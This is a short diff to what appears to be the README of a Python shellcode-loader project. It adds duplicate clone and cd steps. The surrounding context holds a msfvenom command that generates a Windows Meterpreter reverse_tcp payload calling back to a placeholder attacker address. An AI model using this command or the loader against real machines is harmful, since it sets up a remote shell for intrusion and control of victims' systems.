@@ -8,7 +8,10 @@
 git clone https://github.com/HZzz2/python-shellcode-loader.git <br />cd python-shellcode-loader
 <a name="CuRMC"></a>
 
+git clone https://github.com/HZzz2/python-shellcode-loader.git
+cd python-shellcode-loader
 pip install -r .\requirements.txt
+
 ## 生成shellcode
 #生成shellcode<br />`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=9999 -f raw > rev.raw`
 <a name="rNUTI"></a>
